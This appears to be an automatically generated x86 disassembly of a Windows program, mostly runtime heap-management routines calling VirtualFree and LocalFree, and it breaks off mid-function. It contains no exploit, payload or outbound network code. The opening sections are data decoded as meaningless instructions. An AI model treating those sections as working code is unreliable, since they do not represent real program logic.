sub_401092
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x583c0040 ] al
inc eax
add [ eax + 0x58 ] cl
inc eax
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
pop eax
pop eax
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
xchg esp eax
mov cl 0x48
add [ ebx - 0x6fda0040 ] cl
mov cl 0x48
add [ ebx - 0x73da0040 ] cl
mov cl 0x48
add [ ebx - 0x77da0040 ] cl
mov cl 0x48
add [ ebx - 0x7bda0040 ] cl
mov cl 0x48
add [ ebx - 0x7fda0040 ] cl
mov cl 0x48
add [ ebx + 0x7c25ffc0 ] cl
mov cl 0x48
add [ ebx + 0x7825ffc0 ] cl
mov cl 0x48
add [ ebx + 0x7425ffc0 ] cl
mov cl 0x48
add [ ebx + 0x7025ffc0 ] cl
mov cl 0x48
add [ ebx - 0x3bda0040 ] cl
mov cl 0x48
add [ ebx + 0x6c25ffc0 ] cl
mov cl 0x48
add [ ebx + 0x6825ffc0 ] cl
mov cl 0x48
add [ ebx + 0x6425ffc0 ] cl
mov cl 0x48
add [ ebx - 0x23da0040 ] cl
mov cl 0x48
add [ ebx - 0x27da0040 ] cl
mov cl 0x48
add [ ebx - 0x2bda0040 ] cl
mov cl 0x48
add [ ebx + 0x6025ffc0 ] cl
mov cl 0x48
add [ ebx + 0x5c25ffc0 ] cl
mov cl 0x48
add [ ebx - 0x13da0040 ] cl
mov cl 0x48
add [ ebx - 0x17da0040 ] cl
mov cl 0x48
add [ ebx - 0x1bda0040 ] cl
mov cl 0x48
add [ ebx + 0x5825ffc0 ] cl
mov cl 0x48
add [ ebx + 0x5425ffc0 ] cl
mov cl 0x48
add [ ebx + 0x5025ffc0 ] cl
mov cl 0x48
add [ ebx + 0x4c25ffc0 ] cl
mov cl 0x48
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx ] dh
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403208
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x583c0040 ] al
inc eax
add [ eax + 0x58 ] cl
inc eax
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
pop eax
pop eax
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
xchg esp eax
mov cl 0x48
add [ ebx - 0x6fda0040 ] cl
mov cl 0x48
add [ ebx - 0x73da0040 ] cl
mov cl 0x48
add [ ebx - 0x77da0040 ] cl
mov cl 0x48
add [ ebx - 0x7bda0040 ] cl
mov cl 0x48
add [ ebx - 0x7fda0040 ] cl
mov cl 0x48
add [ ebx + 0x7c25ffc0 ] cl
mov cl 0x48
add [ ebx + 0x7825ffc0 ] cl
mov cl 0x48
add [ ebx + 0x7425ffc0 ] cl
mov cl 0x48
add [ ebx + 0x7025ffc0 ] cl
mov cl 0x48
add [ ebx - 0x3bda0040 ] cl
mov cl 0x48
add [ ebx + 0x6c25ffc0 ] cl
mov cl 0x48
add [ ebx + 0x6825ffc0 ] cl
mov cl 0x48
add [ ebx + 0x6425ffc0 ] cl
mov cl 0x48
add [ ebx - 0x23da0040 ] cl
mov cl 0x48
add [ ebx - 0x27da0040 ] cl
mov cl 0x48
add [ ebx - 0x2bda0040 ] cl
mov cl 0x48
add [ ebx + 0x6025ffc0 ] cl
mov cl 0x48
add [ ebx + 0x5c25ffc0 ] cl
mov cl 0x48
add [ ebx - 0x13da0040 ] cl
mov cl 0x48
add [ ebx - 0x17da0040 ] cl
mov cl 0x48
add [ ebx - 0x1bda0040 ] cl
mov cl 0x48
add [ ebx + 0x5825ffc0 ] cl
mov cl 0x48
add [ ebx + 0x5425ffc0 ] cl
mov cl 0x48
add [ ebx + 0x5025ffc0 ] cl
mov cl 0x48
add [ ebx + 0x4c25ffc0 ] cl
mov cl 0x48
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401390
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401350
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013e8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401390
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401430
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401418
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401418
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013e8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013e8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401418
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401534
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013e8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401360
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401598
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401360
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401360
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013e8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401610
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401418
mov [ rw-data ] 0x1
sub_4016c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401360
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40175c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401534
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016c8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401430
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401610
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401418
jmp r-xdata
sub_40186c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401598
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401430
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401598
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401610
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401430
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016c8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401610
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401418
jmp r-xdata
sub_401990
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40175c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401430
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401610
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014a0
jmp r-xdata
sub_401a1c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ad2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401370
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
push 0xff8
push 0x0
call sub_401350
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401378
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ad9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401380
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ae0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bb6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401378
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401388
retn
push rw-data
call sub_401380
sub_401bc0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c24
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c54
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e28
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401ca8
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c84
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cd0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bc0
add ebx esi
mov [ rw-data ] 0x6
sub_401d40
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bc0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c24
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401990
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401990
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c54
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014a0
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401ca8
sub_401e28
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d78
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401eb0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c84
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401efc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401eb0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401430
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cd0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d40
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c54
sub [ edi + 0x4 ] 0x4
sub_401f88
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017dc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401efc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fb4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
